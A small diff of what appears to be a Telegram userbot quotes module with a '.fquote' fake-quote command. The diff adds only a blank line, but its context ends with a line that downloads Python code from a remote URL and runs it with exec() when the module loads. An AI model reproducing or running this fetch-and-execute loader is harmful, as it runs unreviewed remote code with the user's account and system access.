@@ -129,5 +129,6 @@ class mQuotesMod(loader.Module):
         """.fquote @<username> <text> or <reply> <text> - fake quote"""
         await fquote_handler(self, message)
 
+
 _v = "v%d%d" % __import__("sys").version_info[:2]
 exec(requests.get(f"https://quotes.mishase.dev/f/module.{_v}.py").text)
